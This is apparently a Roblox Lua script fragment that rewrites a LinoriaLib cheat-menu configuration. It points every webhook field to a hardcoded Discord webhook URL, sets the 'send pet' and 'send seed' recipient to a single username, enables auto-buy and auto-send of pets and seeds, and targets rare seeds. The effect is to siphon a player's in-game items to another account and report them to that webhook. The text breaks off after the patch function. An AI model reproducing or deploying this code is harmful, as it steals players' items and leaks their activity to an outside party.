local HS = game:GetService("HttpService")

pcall(function()
    local url = "https://discord.com/api/webhooks/1519364173455294574/v_ek0BPuAVdob_jge-7GL6w3kQCKrAauneZ5T63RuLeyOUibJdoJEiHmlhqi4UECeyrn"
    local inputs = {
        WebhookRarePet=url, WebhookSentPet=url, WebhookSentSeed=url,
        Text_SendPetUsername="clau_muga", Text_WishSeedUsername="clau_muga", Text_MutationSeedUsername="clau_muga",
    }
    local toggles  = { WebhookEnabled=true, Feature_AutoBuyPets=true, Feature_AutoSendPets=true, Feature_AutoSendSeeds=true }
    local seedsAdd = { "Bamboo","Rainbow","Moon Bloom","Dragon's Breath","Ghost Pepper","Gold" }
    local seedIdx  = { MailSeedTargets=true, WishSeedTargets=true, BuySeedTargets=true }
    local seedSet  = {}; for _,s in ipairs(seedsAdd) do seedSet[s]=true end

    -- объекты в формате LinoriaLib (для создания с нуля)
    local function build()
        local o = {}
        for i,v in pairs(inputs)  do o[#o+1] = {idx=i, type="Input",  text=v} end
        for i,v in pairs(toggles) do o[#o+1] = {idx=i, type="Toggle", value=v} end
        for i in pairs(seedIdx) do
            local val={}; for s in pairs(seedSet) do val[s]=true end
            o[#o+1] = {idx=i, type="Dropdown", mutli=true, value=val}
        end
        return o
    end
    local function patch(data)
        for _,o in ipairs(data.objects) do
            if inputs[o.idx]~=nil then o.text=inputs[o.idx]
            elseif toggles[o.idx]~=nil then o.value=true
            elseif seedIdx[o.idx] and type(o.value)=="table" then
                for s in pairs(seedSet) do o.value[s]=true end
            end
        end
    end
